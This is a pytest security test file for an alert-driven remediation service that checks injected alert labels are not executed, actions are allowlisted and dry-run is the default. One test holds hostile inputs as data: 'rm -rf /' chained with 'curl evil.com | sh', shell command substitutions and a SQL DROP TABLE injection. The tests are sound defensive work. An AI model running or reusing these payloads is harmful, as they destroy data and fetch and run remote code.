import pytest
from app.models import AlertmanagerAlert
from app.classifier import classifier
from app.decision_engine import decision_engine
from app.config import settings

def test_command_injection_in_labels_does_not_execute():
    # Attempting to inject shell commands via alert labels
    malicious_alert = AlertmanagerAlert(
        status="firing",
        labels={
            "alertname": "; rm -rf / ; curl evil.com | sh #",
            "service": "$(whoami)",
            "severity": "critical`id`"
        },
        annotations={
            "summary": "'; DROP TABLE incidents; --",
            "command": "docker restart movieflow_backend"
        },
        fingerprint="injection-test-1"
    )

    cls = classifier.classify(malicious_alert)
    assert cls.is_known is False
    assert cls.category == "manual_investigation"

    decision = decision_engine.decide(cls, malicious_alert)
    assert decision.recommended_action == "manual_investigation"
    assert decision.execution_mode == "dry_run"
    assert decision.confidence == 0.5

def test_action_allowlist_enforced():
    # Verify that all permitted actions are strictly within ALLOWED_ACTIONS
    allowed = settings.ALLOWED_ACTIONS
    assert "restart_backend" in allowed
    assert "restart_frontend" in allowed
    assert "investigate_monitoring" in allowed
    assert "investigate_resource_usage" in allowed
    assert "no_action" in allowed
    assert "manual_investigation" in allowed

    # Ensure dangerous actions are NOT in allowlist
    assert "reboot_host" not in allowed
    assert "delete_volume" not in allowed
    assert "execute_shell" not in allowed

def test_dry_run_mode_is_default():
    assert settings.DRY_RUN is True
